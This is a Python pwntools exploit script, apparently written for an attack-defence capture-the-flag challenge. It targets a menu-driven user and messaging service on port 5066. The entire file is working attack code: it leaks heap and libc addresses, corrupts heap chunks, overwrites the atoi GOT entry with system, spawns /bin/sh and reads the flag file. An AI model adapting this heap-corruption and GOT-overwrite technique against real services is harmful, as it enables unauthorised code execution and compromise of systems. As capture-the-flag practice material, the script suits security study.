#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./pwn22"
os.environ={"LD_LIBRARY_PATH":"./"}
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")

def exploit(ip):
    heap_add=0
    r=remote(ip,5066)
    def debug():
        log.debug("process pid:%d"%pid)
        #log.debug("stack add:0x%x"%stack_add)
        log.debug("heap add:0x%x"%heap_add)
        log.debug("libc add:0x%x"%libc.address)
        pause()

    def reg(size,user,age,desc):
        r.sendafter("choice:","2")
        r.sendafter("size:",str(size))
        r.sendafter("name:",user)
        r.sendafter("age:",str(age))
        if age>17:
            r.sendafter("description:",desc)

    def login(user):
        r.sendafter("choice:","1")
        r.sendafter("name:",user)

    def add(name):
        r.sendafter("choice:","3")
        r.sendafter("name:",name)
        r.sendafter("(a/d)","a")
    def dele(name):
        r.sendafter("choice:","3")
        r.sendafter("name:",name)
        r.sendafter("(a/d)","d")

    def edit(name,age,desc):
        r.sendafter("choice:","2")
        r.sendafter("name",name)
        r.sendafter("age:",str(age))
        r.sendafter("ption:",desc)

    def show():
        r.sendafter("choice:","1")
        r.recvuntil("Username:")
        name=r.recvline()[:-1]
        r.recvuntil("Age:")
        age=int("0x"+r.recvline(),16)
        r.recvuntil("Description:")
        desc=r.recvline()[:-1]
        return name,age,desc

    def send(title,content,user):
        r.sendafter("choice:","4")
        r.sendafter("a msg to:",user)
        r.sendafter("title:",title)
        r.sendafter("content:",content)

    def logout():
        r.sendafter("choice:","6")
    reg(0x20,"a"*0x10,20,"a"*0x100)
    reg(0x20,"b"*0x10,20,"a"*0x100)
    reg(0x20,"c"*0x10,20,"a"*0x100)
    login("a"*0x10)
    add("b"*0x10)
    name,age,desc=show()
    heap_add=u64(desc[0x100:].ljust(8,"\x00"))-0x2640
    dele("b"*0x10)
    logout()
    login(p64(heap_add+0x26f0))
    name,age,desc=show()
    libc.address=age-0x3c4b78-0x1c40
    logout()
    login("a"*0x10)
    send("d"*8+"\x00","d"*8,"c"*0x10)
    logout()
    login("d"*8+"\x00")
    f={
        0x48:p64(0x101)
    }
    edit("d"*8,0x20,fit(f,filler="\x00"))
    logout()
    login("a"*0x10+"\x00")
    f={
        0xb0:p64(elf.got["atoi"]),
    }
    send(fit(f,filler="1"),"a","c"*0x10+"\x00")
    logout()
    login(p64(libc.sym["atoi"]))
    edit(p64(libc.sym["system"])[:6],20,"a")
    r.sendafter("choice:","/bin/sh")
    r.clean()
    r.sendline("cat /flag")
    flag=r.recvline()[:-1]
    r.close()
    return flag

if __name__ == "__main__":
    print exploit("172.16.5.22")
